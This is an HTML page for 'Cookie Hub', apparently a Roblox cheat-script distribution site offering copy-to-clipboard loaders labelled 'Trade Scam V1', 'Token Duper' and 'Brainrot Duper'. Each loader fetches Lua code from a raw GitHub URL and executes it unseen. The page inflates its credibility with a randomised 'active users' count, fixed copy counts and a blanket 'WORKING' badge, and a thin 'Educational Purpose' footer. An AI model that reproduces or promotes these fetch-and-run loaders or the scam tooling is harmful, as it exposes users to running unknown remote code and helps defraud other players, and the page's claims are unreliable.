<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Cookie Hub</title>

<style>
*{
  box-sizing:border-box;
  -webkit-user-select:none;
  user-select:none;
}
body{
  margin:0;
  font-family:'Segoe UI',sans-serif;
  background: radial-gradient(circle at top, #3b1d6a, #0b0617 70%);
  color:#fff;
  min-height:100vh;
  overflow-x:hidden;
}

/* PARTICLES */
#particles{
  position:fixed;
  inset:0;
  z-index:0;
  pointer-events:none;
}

/* MAIN UI */
.container{
  position:relative;
  z-index:1;
  max-width:420px;
  margin:40px auto;
  background:rgba(15,10,30,.85);
  border-radius:18px;
  padding:20px;
  box-shadow:0 0 40px rgba(140,60,255,.35);
}

h1{
  text-align:center;
  margin:0;
  font-size:30px;
  background:linear-gradient(90deg,#ffb347,#c77dff);
  -webkit-background-clip:text;
  -webkit-text-fill-color:transparent;
}
.subtitle{
  text-align:center;
  opacity:.85;
  margin-top:5px;
}
.active{
  text-align:center;
  margin:10px 0 20px;
  font-size:14px;
}
.pulse{
  animation:pulse 2s infinite;
}
@keyframes pulse{
  0%{opacity:.6}
  50%{opacity:1}
  100%{opacity:.6}
}

.tabs{
  display:flex;
  gap:8px;
  margin-bottom:15px;
}
.tab{
  flex:1;
  padding:10px;
  border-radius:10px;
  background:#1a1230;
  text-align:center;
  cursor:pointer;
  transition:.3s;
}
.tab.active{
  background:linear-gradient(90deg,#8f4dff,#c77dff);
}

.card{
  background:#0f0b22;
  border-radius:14px;
  padding:15px;
  animation:fade .35s ease;
}
@keyframes fade{
  from{opacity:0; transform:translateY(8px)}
  to{opacity:1; transform:translateY(0)}
}

.title{
  font-size:20px;
  margin-bottom:6px;
}
.status{
  font-size:13px;
  margin-bottom:8px;
}
.status span{
  color:#6aff8a;
}

pre{
  background:#05030c;
  padding:12px;
  border-radius:10px;
  overflow-x:auto;
  font-size:12px;
  user-select:text;
}

button{
  width:100%;
  margin-top:12px;
  padding:14px;
  border:none;
  border-radius:12px;
  background:linear-gradient(90deg,#8f4dff,#c77dff);
  color:#000;
  font-weight:bold;
  font-size:15px;
  cursor:pointer;
}

.stats{
  text-align:center;
  margin-top:8px;
  font-size:13px;
  opacity:.7;
}

.toast{
  position:fixed;
  bottom:20px;
  left:50%;
  transform:translateX(-50%);
  background:#1f123d;
  padding:10px 18px;
  border-radius:20px;
  opacity:0;
  transition:.3s;
  z-index:99;
}
.toast.show{opacity:1}

footer{
  text-align:center;
  font-size:12px;
  opacity:.5;
  margin-top:18px;
}
</style>
</head>

<body>

<canvas id="particles"></canvas>

<div class="container">
  <h1>🍪 Cookie Hub</h1>
  <div class="subtitle">Premium Script Hub</div>
  <div class="active pulse">👥 Active Users: <span id="users">189</span></div>

  <div class="tabs">
    <div class="tab active" onclick="switchTab(0)">Trade Scam V1</div>
    <div class="tab" onclick="switchTab(1)">Token Duper</div>
    <div class="tab" onclick="switchTab(2)">Brainrot Duper</div>
  </div>

  <div id="content"></div>
  <footer>© Cookie Hub · Educational Purpose</footer>
</div>

<div id="toast" class="toast">✅ Script Copied</div>

<script>
/* SCRIPTS */
const scripts=[
{
name:"Cookie Trade Scam V1",
code:`loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/TradescamV1/refs/heads/main/cookiescripts.lua"))()`,
copies:2431
},
{
name:"Cookie Script Token Duper",
code:`loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/Tokenduper/refs/heads/main/Cookiescripts.lua"))()`,
copies:1892
},
{
name:"Cookie Brainrot Duper (ETFB)",
code:`loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/Cookiescriptsduper/refs/heads/main/cookiescripts.lua"))()`,
copies:3015
}
];

const content=document.getElementById("content");
const toast=document.getElementById("toast");
let current=0;

function render(){
  const s=scripts[current];
  content.innerHTML=`
  <div class="card">
    <div class="title">${s.name} 🍪</div>
    <div class="status">🟢 <span>WORKING</span></div>
    <pre>${s.code}</pre>
    <button onclick="copyScript()">📋 Copy Script</button>
    <div class="stats">Copied ${s.copies} times</div>
  </div>`;
}

function switchTab(i){
  document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active"));
  document.querySelectorAll(".tab")[i].classList.add("active");
  current=i;
  render();
}

function copyScript(){
  navigator.clipboard.writeText(scripts[current].code);
  scripts[current].copies++;
  render();
  toast.classList.add("show");
  if(navigator.vibrate) navigator.vibrate(40);
  setTimeout(()=>toast.classList.remove("show"),1200);
}

document.getElementById("users").innerText=186+Math.floor(Math.random()*8);
render();

/* PARTICLE ANIMATION */
const canvas=document.getElementById("particles");
const ctx=canvas.getContext("2d");

function resize(){
  canvas.width=innerWidth;
  canvas.height=innerHeight;
}
resize();
addEventListener("resize",resize);

const particles=[];
for(let i=0;i<90;i++){
  particles.push({
    x:Math.random()*canvas.width,
    y:Math.random()*canvas.height,
    r:Math.random()*2+0.5,
    s:Math.random()*0.6+0.2,
    o:Math.random()*0.6+0.2
  });
}

function animate(){
  ctx.clearRect(0,0,canvas.width,canvas.height);
  for(const p of particles){
    ctx.fillStyle=`rgba(255,255,255,${p.o})`;
    ctx.beginPath();
    ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
    ctx.fill();
    p.y+=p.s;
    if(p.y>canvas.height){
      p.y=-10;
      p.x=Math.random()*canvas.width;
    }
  }
  requestAnimationFrame(animate);
}
animate();
</script>

</body>
</html>
